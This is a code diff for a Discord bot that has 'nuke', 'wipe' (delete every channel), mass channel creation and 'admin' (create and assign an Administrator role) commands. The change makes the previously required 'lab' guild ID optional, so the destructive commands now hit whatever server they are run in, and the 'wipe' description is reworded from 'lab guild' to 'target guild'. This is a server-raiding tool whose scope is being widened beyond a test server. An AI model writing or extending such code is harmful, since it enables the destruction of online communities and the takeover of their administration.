@@ -9,10 +9,11 @@ const {
 const token = process.env.DISCORD_TOKEN;
 const clientId = process.env.CLIENT_ID;
 const OWNER_ID = process.env.OWNER_ID;
-const NUKE_GUILD_ID = process.env.NUKE_GUILD_ID;
+const NUKE_GUILD_ID = (process.env.NUKE_GUILD_ID || '').trim(); // optional
 const port = Number(process.env.PORT || 10000);
-if (!token || !clientId || !OWNER_ID || !NUKE_GUILD_ID)
-  throw new Error('DISCORD_TOKEN, CLIENT_ID, OWNER_ID, NUKE_GUILD_ID are required');
+
+if (!token || !clientId || !OWNER_ID)
+  throw new Error('DISCORD_TOKEN, CLIENT_ID, OWNER_ID are required');
 
 const app = express();
 app.get('/health', (_req, res) => res.json({
@@ -56,7 +57,7 @@ const commands = [
     .addIntegerOption(o => o.setName('count').setDescription('How many channels').setMinValue(1).setMaxValue(2000).setRequired(true))
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
   new SlashCommandBuilder().setName('wipe')
-    .setDescription('Delete every channel in the lab guild')
+    .setDescription('Delete every channel in the target guild')
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
   new SlashCommandBuilder().setName('admin')
     .setDescription('Create owner role with Administrator and assign to you')
@@ -75,6 +76,7 @@ client.once('ready', async () => {
   console.log(`Logged in as ${client.user.tag}`);
   console.log(`Bot is in ${client.guilds.cache.size} guild(s):`);
   client.guilds.cache.forEach(g => console.log(`  ${g.id} вЂ” ${g.name}`));
+  console.log(`NUKE_GUILD_ID: ${NUKE_GUILD_ID || '(unset вЂ” commands use current guild)'}`);
 });
 
 async function purgeRecent(channel, requested, keepMedia, onProgress) {
@@ -194,23 +196,31 @@ client.on('interactionCreate', async interaction => {
 
       if (interaction.commandName === 'guilds') {
         const list = client.guilds.cache.map(g => `\`${g.id}\` вЂ” **${g.name}**`).join('\n') || '_(none)_';
-        const match = client.guilds.cache.get(NUKE_GUILD_ID);
+        const match = NUKE_GUILD_ID ? client.guilds.cache.get(NUKE_GUILD_ID) : null;
+        const mode = NUKE_GUILD_ID
+          ? `**NUKE_GUILD_ID:** \`${NUKE_GUILD_ID}\`\n**Resolves to:** ${match ? `\u2705 ${match.name}` : '\u274C not found'}`
+          : '**NUKE_GUILD_ID:** _(unset вЂ” commands target the guild they run in)_';
         return interaction.reply({
-          content: `**Bot is in ${client.guilds.cache.size} guild(s):**\n${list}\n\n**NUKE_GUILD_ID:** \`${NUKE_GUILD_ID}\`\n**Resolves to:** ${match ? `\u2705 ${match.name}` : '\u274C not found'}`,
+          content: `**Bot is in ${client.guilds.cache.size} guild(s):**\n${list}\n\n${mode}`,
           ephemeral: true
         });
       }
 
-      let guild = client.guilds.cache.get(NUKE_GUILD_ID)
-        ?? await client.guilds.fetch({ guild: NUKE_GUILD_ID, force: true }).catch(() => null);
-
-      if (!guild) {
-        const inList = client.guilds.cache.map(g => `\`${g.id}\` (${g.name})`).join(', ') || 'none';
-        console.log(`[lab] guild ${NUKE_GUILD_ID} not resolvable. bot in: ${inList}`);
-        return interaction.reply({
-          content: `ratman4080: can't reach guild \`${NUKE_GUILD_ID}\`. Bot is in: ${inList}.\nRun \`/guilds\` for the full list.`,
-          ephemeral: true
-        });
+      let guild;
+      if (NUKE_GUILD_ID) {
+        guild = client.guilds.cache.get(NUKE_GUILD_ID)
+          ?? await client.guilds.fetch({ guild: NUKE_GUILD_ID, force: true }).catch(() => null);
+        if (!guild) {
+          const inList = client.guilds.cache.map(g => `\`${g.id}\` (${g.name})`).join(', ') || 'none';
+          console.log(`[lab] NUKE_GUILD_ID ${NUKE_GUILD_ID} not resolvable. bot in: ${inList}`);
+          return interaction.reply({
+            content: `ratman4080: NUKE_GUILD_ID \`${NUKE_GUILD_ID}\` not reachable. Bot is in: ${inList}.\nRun \`/guilds\`. Clear NUKE_GUILD_ID to use current guild.`,
+            ephemeral: true
+          });
+        }
+      } else {
+        guild = interaction.guild;
+        if (!guild) return interaction.reply({ content: 'ratman4080: no guild context.', ephemeral: true });
       }
 
       if (interaction.commandName === 'nuke') {
